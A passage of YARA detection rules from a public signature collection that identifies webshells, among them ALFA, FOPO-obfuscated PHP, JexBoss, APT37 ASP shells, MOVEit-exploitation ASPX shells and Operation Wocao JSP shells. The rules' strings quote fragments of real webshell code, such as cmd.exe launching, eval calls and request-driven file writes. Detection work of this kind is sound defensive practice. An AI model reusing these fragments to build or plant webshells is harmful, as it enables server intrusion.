		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9814-L9832"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "651568b2b95c9e5c2b60fb3245e5afe4290235979e3df15bad96ccd08ae234ef"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "a39d8823d54c55e60a7395772e50d116408804c1a5368391a1e5871dbdc83547"

	strings:
		$x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
		$x2 = "#solevisible@gmail.com" fullword ascii
		$x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
		$x4 = "$GLOBALS['__ALFA__']" fullword ascii
		$x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
		$f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A }

	condition:
		( filesize <900KB and 2 of ($x*) or $f1 at ( filesize -22))
}
rule SIGNATURE_BASE_Webshell_FOPO_Obfuscation_APT_ON_Nov17_1 : FILE {
    meta:
		description = "Detects malware from NK APT incident DE"
		author = "Florian Roth (Nextron Systems)"
		id = "0122bb03-8ff0-554d-8fee-458f0ddd7664"
		date = "2017-11-17"
		modified = "2023-12-05"
		reference = "Internal Research - ON"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9834-L9853"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "3c5bc3ee0218d4ce6902e49d7f938264ecd158f1f458e2fcef878f06f003ed08"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ed6e2e0027d3f564f5ce438984dc8a54577df822ce56ce079c60c99a91d5ffb1"

	strings:
		$x1 = "Obfuscation provided by FOPO" fullword ascii
		$s1 = "\";@eval($" ascii
		$f1 = { 22 29 29 3B 0D 0A 3F 3E }

	condition:
		uint16(0)==0x3f3c and filesize <800KB and ($x1 or ($s1 in (0..350) and $f1 at ( filesize -23)))
}
rule SIGNATURE_BASE_Webshell_Jexboss_JSP_1 : FILE {
    meta:
		description = "Detects JexBoss JSPs"
		author = "Florian Roth (Nextron Systems)"
		id = "4fe7a20b-dc2b-509b-bcf8-e3bfbbe7431a"
		date = "2018-11-08"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9855-L9872"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "f540bbc88bffd0c961837416bd5166fd3cb54b6124ffffbf1cd60e49ab01bd30"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "41e0fb374e5d30b2e2a362a2718a5bf16e73127e22f0dfc89fdb17acbe89efdf"

	strings:
		$x1 = "equals(\"jexboss\")"
		$x2 = "%><pre><%if(request.getParameter(\"ppp\") != null &&" ascii
		$s1 = "<%@ page import=\"java.util.*,java.io.*\"%><pre><% if (request.getParameter(\""
		$s2 = "!= null && request.getHeader(\"user-agent\"" ascii
		$s3 = "String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>" fullword ascii

	condition:
		uint16(0)==0x253c and filesize <1KB and 1 of ($x*) or 2 of them
}
rule SIGNATURE_BASE_Webshell_Jexboss_WAR_1 : FILE {
    meta:
		description = "Detects JexBoss versions in WAR form"
		author = "Florian Roth (Nextron Systems)"
		id = "0973f6cf-8a5f-5449-812e-36aa6b9939df"
		date = "2018-11-08"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9874-L9897"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "ee9cb22496d2e36d215caa9c7e295b41cb8434322a0097bbc3d1a365dce0c156"
		score = 75
		quality = 85
		tags = "FILE"
		hash1 = "6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092"
		hash2 = "6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf"

	strings:
		$ = "jbossass" fullword ascii
		$ = "jexws.jsp" fullword ascii
		$ = "jexws.jspPK" fullword ascii
		$ = "jexws1.jsp" fullword ascii
		$ = "jexws1.jspPK" fullword ascii
		$ = "jexws2.jsp" fullword ascii
		$ = "jexws2.jspPK" fullword ascii
		$ = "jexws3.jsp" fullword ascii
		$ = "jexws3.jspPK" fullword ascii
		$ = "jexws4.jsp" fullword ascii
		$ = "jexws4.jspPK" fullword ascii

	condition:
		uint16(0)==0x4b50 and filesize <4KB and 1 of them
}
rule SIGNATURE_BASE_Webshell_Tinyasp : FILE {
    meta:
		description = "Detects 24 byte ASP webshell and variations"
		author = "Jeff Beley"
		id = "38b1f61b-e506-59b2-9157-d0345431c429"
		date = "2019-01-09"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9899-L9910"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "d8b7db89ea623d5bcf14476779df727827cfc752d4c6ba4208445fd7305e6943"
		score = 75
		quality = 83
		tags = "FILE"
		hash1 = "1f29905348e136b66d4ff6c1494d6008ea13f9551ad5aa9b991893a31b37e452"

	strings:
		$s1 = "Execute Request" ascii wide nocase

	condition:
		uint16(0)==0x253c and filesize <150 and 1 of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Mar21_1 : FILE {
    meta:
		description = "Detects ASPX Web Shells"
		author = "Florian Roth (Nextron Systems)"
		id = "52884135-6b86-5e3e-a866-36a812d5a9af"
		date = "2021-03-12"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9912-L9937"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "acc0d67326d1f764d6fc54681b38f491c55968ec34e40d181426cfcf418eeb21"
		score = 75
		quality = 83
		tags = "FILE"
		hash1 = "10b6e82125a2ddf3cc31a238e0d0c71a64f902e0d77171766713affede03174d"
		hash2 = "170bee832df176aac0a3c6c7d5aa3fee413b4572030a24c994a97e70f6648ffc"
		hash3 = "31c4d1fc81c052e269866deff324dffb215e7d481a47a2b6357a572a3e685d90"
		hash4 = "41b5c26ac194439612b68e9ec6a638eceaf00842c347ffa551eb009ef6c015a3"
		hash5 = "4b645bc773acde2b3cc204e77ac27c3f6991046c3b75f42d12bc90ec29cff9e3"
		hash6 = "602bb701b78895d4de32f5e78f3c511e5298ba244b29641b11a7c1c483789859"
		hash7 = "7ac47a17c511e25c06a53a1c7a5fbbf05f41f047a4a40b71afa81ce7b59f4b03"
		hash8 = "9a5097d0e8dc29a2814adac070c80fd4b149b33e56aaaf9235af9e87b0501d91"
		hash9 = "9efb5932c0753e45504fc9e8444209b92c2bdf22e63b1c1a44e2d52cb62b4548"
		hash10 = "d40b16307d6434c3281374c0e1bbc0f6db388883e7f6266c3c81de0694266882"

	strings:
		$s1 = ".StartInfo.FileName = 'cmd.exe';" ascii fullword
		$s2 = "<xsl:template match=\"\"/root\"\">" ascii fullword
		$s3 = "<?xml version=\"\"1.0\"\"?><root>test</root>\";" ascii fullword

	condition:
		uint16(0)==0x253c and filesize <6KB and all of them
}
rule SIGNATURE_BASE_Hvs_APT37_Webshell_Img_Thumbs_Asp : FILE {
    meta:
		description = "Webshell named img.asp, thumbs.asp or thumb.asp used by APT37"
		author = "Moritz Oettle"
		id = "e45d4507-81de-5f72-9ce2-4f0e3e5c62b1"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_lazarus_dec20.yar#L68-L95"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "94d2448d3794ae3f29678a7337473d259b5cfd1c7f703fe53ee6c84dd10a48ef"
		logic_hash = "58ccee11c08330c8cd4148e623a2e59e024d6d5f3067331dbdd962d0f6a8daa4"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "strMsg = \"E : F\"" fullword ascii
		$s2 = "strMsg = \"S : \" & Len(fileData)" fullword ascii
		$s3 = "Left(workDir, InStrRev(workDir, \"/\")) & \"video\""
		$a1 = "Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$a2 = "Dim tmpPath, workDir" fullword ascii
		$a3 = "Dim objFSO, objTextStream" fullword ascii
		$a4 = "workDir = Request.ServerVariables(\"URL\")" fullword ascii
		$a5 = "InStrRev(workDir, \"/\")" ascii
		$g1 = "WriteFile = 0" fullword ascii
		$g2 = "fileData = Request.Form(\"fp\")" fullword ascii
		$g3 = "fileName = Request.Form(\"fr\")" fullword ascii
		$g4 = "Err.Clear()" fullword ascii
		$g5 = "Option Explicit" fullword ascii

	condition:
		filesize <2KB and ((1 of ($s*)) or (3 of ($a*)) or (5 of ($g*)))
}
rule SIGNATURE_BASE_Hvs_APT37_Webshell_Template_Query_Asp : FILE {
    meta:
		description = "Webshell named template-query.aspimg.asp used by APT37"
		author = "Moritz Oettle"
		id = "dc006b46-4c51-59cd-8b7d-adbfec86cd2e"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_lazarus_dec20.yar#L97-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "961a66d01c86fa5982e0538215b17fb9fae2991331dfea812b8c031e2ceb0d90"
		logic_hash = "d8bd017e9103bddb0b8a86effa8a4b0617b54bd643bcc36b6f678a3e60f8559f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$g1 = "server.scripttimeout=600" fullword ascii
		$g2 = "response.buffer=true" fullword ascii
		$g3 = "response.expires=-1" fullword ascii
		$g4 = "session.timeout=600" fullword ascii
		$a1 = "redhat hacker" ascii
		$a2 = "want_pre.asp" ascii
		$a3 = "vgo=\"admin\"" ascii
		$a4 = "ywc=false" ascii
		$s1 = "public  br,ygv,gbc,ydo,yka,wzd,sod,vmd" fullword ascii

	condition:
		filesize >70KB and filesize <200KB and ((1 of ($s*)) or (2 of ($a*)) or (3 of ($g*)))
}
rule SIGNATURE_BASE_Hvs_APT37_Webshell_Controllers_Asp : FILE {
    meta:
		description = "Webshell named controllers.asp or inc-basket-offer.asp used by APT37"
		author = "Moritz Oettle"
		id = "82370415-30f4-514d-8806-e2daced96f07"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_lazarus_dec20.yar#L140-L218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "829462fc6d84aae04a962dfc919d0a392265fbf255eab399980d2b021e385517"
		logic_hash = "a6e53e99f7500683d3b62a7630cecb53ee6c13b335cbf9912366675db964aefe"
		score = 75
		quality = 28
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@Language=VBScript.Encode" ascii
		$x1 = { 64 7F 44 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x2 = { 64 7F 49 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x3 = { 64 7F 49 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x4 = { 64 7F 49 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x5 = { 64 7F 49 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x6 = { 64 7F 49 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x7 = { 64 7F 49 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x8 = { 64 41 44 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x9 = { 64 41 44 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x10 = { 64 41 44 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x11 = { 64 41 44 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x12 = { 64 7F 44 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x13 = { 64 41 44 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x14 = { 64 41 44 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x15 = { 64 41 44 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x16 = { 64 41 44 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x17 = { 64 41 49 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x18 = { 64 41 49 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x19 = { 64 41 49 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x20 = { 64 41 49 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x21 = { 64 41 49 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x22 = { 64 41 49 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x23 = { 64 7F 44 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x24 = { 64 41 49 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x25 = { 64 41 49 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x26 = { 6A 7F 44 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x27 = { 6A 7F 44 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x28 = { 6A 7F 44 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x29 = { 6A 7F 44 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x30 = { 6A 7F 44 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x31 = { 6A 7F 44 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x32 = { 6A 7F 44 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x33 = { 6A 7F 44 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x34 = { 64 7F 44 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x35 = { 6A 7F 49 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x36 = { 6A 7F 49 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x37 = { 6A 7F 49 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x38 = { 6A 7F 49 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x39 = { 6A 7F 49 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x40 = { 6A 7F 49 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x41 = { 6A 7F 49 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x42 = { 6A 7F 49 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x43 = { 6A 41 44 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x44 = { 6A 41 44 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x45 = { 64 7F 44 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x46 = { 6A 41 44 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x47 = { 6A 41 44 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x48 = { 6A 41 44 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x49 = { 6A 41 44 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x50 = { 6A 41 44 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x51 = { 6A 41 44 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x52 = { 6A 41 49 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x53 = { 6A 41 49 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x54 = { 6A 41 49 2D 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x55 = { 6A 41 49 2D 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x56 = { 64 7F 44 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x57 = { 6A 41 49 23 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x58 = { 6A 41 49 23 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x59 = { 6A 41 49 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x60 = { 6A 41 49 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x61 = { 64 7F 44 23 41 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x62 = { 64 7F 44 23 41 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x63 = { 64 7F 49 2D 7F 44 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }
		$x64 = { 64 7F 49 2D 7F 49 63 2F 6D 4D 6B 61 4F 59 62 3A 6E 72 21 59 }

	condition:
		filesize >50KB and filesize <200KB and ($s0 and 1 of ($x*))
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_DLL_Moveit_Jun23_1 : FILE {
    meta:
		description = "Detects compiled ASPX web shells found being used in MOVEit Transfer exploitation"
		author = "Florian Roth"
		id = "47db8602-9a9e-5efc-b8b9-fbc4f3c8d4e9"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/?utm_content=251159938&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/vuln_moveit_0day_jun23.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "47c2ec1e833852941434586b61d6f435b9acb32b2ff48e0a9e8006e0f9ff8056"
		score = 85
		quality = 85
		tags = "FILE"
		hash1 = "6cbf38f5f27e6a3eaf32e2ac73ed02898cbb5961566bb445e3c511906e2da1fa"

	strings:
		$x1 = "human2_aspx" ascii fullword
		$x2 = "X-siLock-Comment" wide
		$x3 = "x-siLock-Step1" wide
		$a1 = "MOVEit.DMZ.Core.Data" ascii fullword

	condition:
		uint16(0)==0x5a4d and filesize <40KB and (1 of ($x*) and $a1) or all of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Moveit_Jun23_1 : FILE {
    meta:
		description = "Detects ASPX web shells as being used in MOVEit Transfer exploitation"
		author = "Florian Roth"
		id = "2c789b9c-5ec5-5fd1-84e3-6bf7735a9488"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/vuln_moveit_0day_jun23.yar#L24-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "436f9a503ad938541faa8f34604310ba6d932e40a41dc189ccd293b7191a7621"
		score = 85
		quality = 85
		tags = "FILE"
		hash1 = "2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5"
		hash2 = "48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a"
		hash3 = "e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e"

	strings:
		$s1 = "X-siLock-Comment" ascii fullword
		$s2 = "]; string x = null;" ascii
		$s3 = ";  if (!String.Equals(pass, " ascii

	condition:
		filesize <150KB and 2 of them
}
rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Console_Jsp {
    meta:
		description = "Strings from the console.jsp webshell"
		author = "Fox-IT SRT"
		id = "1afdfc34-d2e3-58c7-80ea-ee5632e42469"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_op_wocao.yar#L318-L335"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e70c15ef10b63a011edbcedc773a8e2917fd915c3ecc273c3bf2b78eb10fc570"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "String strLogo = request.getParameter(\"image\")"
		$b = "!strLogo.equals(\"web.gif\")"
		$c = "<font color=red>Save Failed!</font>"
		$d = "<font color=red>Save Success!</font>"
		$e = "Save path:<br><input type=text"
		$f = "if (newfile.exists() && newfile.length()>0) { out.println"

	condition:
		1 of them
}
rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Index_Jsp {
    meta:
		description = "Strings from the index.jsp socket tunnel"
		author = "Fox-IT SRT"
		id = "9c226ccd-6c69-523c-bca4-371e55274667"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_op_wocao.yar#L337-L353"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "870dad9fb5456f8edbd9f3c2d0b8764cf1143399626ce4df53c93919bcb1a0cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "X-CMD"
		$x2 = "X-STATUS"
		$x3 = "X-TARGET"
		$x4 = "X-ERROR"
		$a = "out.print(\"All seems fine.\");"

	condition:
		all of ($x*) and $a
}
rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Ver_Jsp {
    meta:
		description = "Strings from the ver.jsp webshell"
		author = "Fox-IT SRT"
		id = "b2828b84-8934-5111-9345-683a07025070"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_op_wocao.yar#L355-L372"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "ada6de4b07a76e79bb17793cda2b51f96554a35992a73f59c360487638ae3be3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "String strLogo = request.getParameter(\"id\")"
		$b = "!strLogo.equals(\"256\")"
		$c = "boolean chkos = msg.startsWith"
		$d = "while((c = er.read()) != -1)"
		$e = "out.print((char)c);}in.close()"
		$f = "out.print((char)c);}er.close()"

	condition:
		1 of them
}
rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Webinfo {
    meta:
		description = "Generic strings from webinfo.war webshells"
		author = "Fox-IT SRT"
		id = "b8477f62-f3f6-5526-b0e3-9b794fefaa1f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_op_wocao.yar#L374-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "711737a56067f24f422cc7d5aeba4389741fe18a0e66f2715fce626c3b6aef19"
		score = 75
		quality = 85
		tags = ""

	strings:
		$var1 = "String strLogo = request.getParameter"
		$var2 = "String content = request.getParameter(\"content\");"
		$var3 = "String basePath=request.getScheme()"
		$var4 = "!strLogo.equals("
		$var5 = "if(path!=null && !path.equals(\"\") && content!=null"
		$var6 = "File newfile=new File(path);"
		$str1 = "Save Success!"
		$str2 = "Save Failed!"

	condition:
		2 of ($var*) or ( all of ($str*) and 1 of ($var*))
}
rule SIGNATURE_BASE_Asp_File : FILE {
    meta:
		description = "Laudanum Injector Tools - file file.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e2a80d1f-f2bb-573b-b68c-71e4dfa6e1fa"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L8-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ff5b1a9598735440bdbaa768b524c639e22f53c5"
		logic_hash = "9ec19a994571f4d1b40b6d6af3fb6eb4c5004a6439b99863b50dae0262677263"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
		$s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
		$s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii
		$s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii
		$s5 = "set folder = fso.GetFolder(path)" fullword ascii
		$s6 = "Set file = fso.GetFile(filepath)" fullword ascii

	condition:
		uint16(0)==0x253c and filesize <30KB and 5 of them
}
rule SIGNATURE_BASE_Php_Killnc : FILE {
    meta:
		description = "Laudanum Injector Tools - file killnc.php"
		author = "Florian Roth (Nextron Systems)"
		id = "241611d3-3636-5a25-b3c3-d45d6cb81c78"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L28-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
		logic_hash = "431a9a66f5d0e42856ca5716c2994c018f77cc338300abd71d94ffe7e75da3bf"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
